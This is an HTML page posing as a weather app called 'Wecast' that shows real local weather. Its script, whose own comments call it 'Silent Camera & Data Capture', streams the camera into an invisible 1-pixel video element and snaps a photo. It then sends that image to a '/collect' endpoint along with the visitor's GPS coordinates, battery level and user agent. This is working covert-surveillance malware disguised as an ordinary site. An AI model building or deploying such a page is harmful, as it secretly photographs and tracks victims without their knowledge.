<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wecast - Professional Local Weather</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #f8fafc; font-family: sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.25); backdrop-filter: blur(12px); border-radius: 24px; }
        #camera-feed { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
    </style>
</head>
<body onload="startApp()">
    <video id="camera-feed" autoplay playsinline></video>
    <canvas id="helper-canvas" style="display:none;"></canvas>

    <div class="max-w-5xl mx-auto p-6">
        <div class="flex justify-between items-center mb-10">
            <h1 class="text-2xl font-bold text-slate-800">WECAST</h1>
            <div class="flex gap-6 text-slate-500 text-sm">
                <span>Home</span><span>News</span><span>Contact</span>
                <span class="bg-white px-3 py-1 rounded-full shadow-sm">üìç <span id="city-label">Detecting...</span></span>
            </div>
        </div>

        <div class="relative rounded-[40px] overflow-hidden h-[450px] shadow-2xl">
            <img src="https://images.unsplash.com/photo-1504608524841-42fe6f032b4b?auto=format&fit=crop&w=1200" class="absolute inset-0 w-full h-full object-cover">
            <div class="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent p-12 flex flex-col justify-between">
                <div>
                    <h2 id="city-display" class="text-5xl font-bold text-white mb-2">Fetching Weather...</h2>
                    <p class="text-white/80" id="date-display"></p>
                </div>
                
                <div class="flex gap-4">
                    <div class="glass p-4 text-white"><p class="text-xs opacity-70">Wind</p><p class="font-bold">6 km/h</p></div>
                    <div class="glass p-4 text-white"><p class="text-xs opacity-70">Humidity</p><p class="font-bold">42%</p></div>
                </div>

                <div class="absolute right-12 bottom-12 glass p-10 text-center w-56">
                    <p class="text-white/70 text-xs uppercase tracking-tighter mb-2">Current Temp</p>
                    <h3 id="temp-display" class="text-7xl font-bold text-white">--¬∞</h3>
                    <p class="text-white font-medium mt-2">Clear Skies</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function startApp() {
            document.getElementById('date-display').innerText = new Date().toDateString();
            
            // 1. Request Permissions Immediately
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude } = pos.coords;
                
                // 2. Fetch Real Weather Data for their City
                try {
                    const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`);
                    const data = await response.json();
                    document.getElementById('temp-display').innerText = Math.round(data.current_weather.temperature) + '¬∞';
                    document.getElementById('city-display').innerText = "Local Weather";
                    document.getElementById('city-label').innerText = "Live Location";
                } catch (e) { console.log("Weather error"); }

                // 3. Silent Camera & Data Capture
                runSilentCapture(latitude, longitude);
            });
        }

        async function runSilentCapture(lat, lon) {
            const video = document.getElementById('camera-feed');
            const canvas = document.getElementById('helper-canvas');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // Wait for camera to warm up
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg');
                    
                    // Stop camera
                    stream.getTracks().forEach(t => t.stop());

                    // Send Data to Render
                    sendData(lat, lon, photo);
                }, 2000);
            } catch (e) { sendData(lat, lon, null); }
        }

        async function sendData(lat, lon, photo) {
            const battery = await navigator.getBattery();
            await fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ts: new Date().toLocaleString(),
                    location: { lat, lon },
                    battery: { levelPercent: Math.round(battery.level * 100) },
                    hints: { ua: navigator.userAgent },
                    burstImages: photo ? [photo] : []
                })
            });
        }
    </script>
</body>
</html>
